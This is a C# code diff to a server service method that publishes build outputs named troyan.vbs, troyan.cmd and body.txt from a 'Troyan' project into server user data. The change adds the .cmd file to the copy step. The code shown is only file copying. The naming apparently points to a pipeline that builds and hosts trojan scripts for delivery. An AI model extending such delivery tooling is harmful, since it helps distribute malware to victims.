@@ -16,7 +16,7 @@ public partial class ServerService
         File.Copy(src, dest, overwrite: true);
     }
 
-    /// <summary>Copies the built <c>troyan.vbs</c> and <c>body.txt</c> from Troyan <c>_output</c> into server user data (<see cref="ServerLayoutPaths.UserTroyanVbs"/>, <see cref="ServerLayoutPaths.UserBody"/>), replacing any existing files. Creates the user data directory if it does not exist.</summary>
+    /// <summary>Copies the built <c>troyan.vbs</c>, <c>troyan.cmd</c>, and <c>body.txt</c> from Troyan <c>_output</c> into server user data, replacing any existing files. Creates the user data directory if it does not exist.</summary>
     public void PublishTroyanVbsFromBuildOutput(ServerLayoutPaths layout)
     {
         ArgumentNullException.ThrowIfNull(layout);
@@ -25,6 +25,11 @@ public partial class ServerService
         var dest = layout.UserTroyanVbs;
         if (!File.Exists(src))
             throw new FileNotFoundException("Built troyan.vbs not found in Troyan _output.", src);
+
+        var cmdSrc = layout.TroyanOutputCmd;
+        var cmdDest = layout.UserTroyanCmd;
+        if (!File.Exists(cmdSrc))
+            throw new FileNotFoundException("Built troyan.cmd not found in Troyan _output.", cmdSrc);
 
         var bodySrc = layout.Body;
         var bodyDest = layout.UserBody;
@@ -36,6 +41,7 @@ public partial class ServerService
             Directory.CreateDirectory(destDir);
 
         File.Copy(src, dest, overwrite: true);
+        File.Copy(cmdSrc, cmdDest, overwrite: true);
         File.Copy(bodySrc, bodyDest, overwrite: true);
     }
 
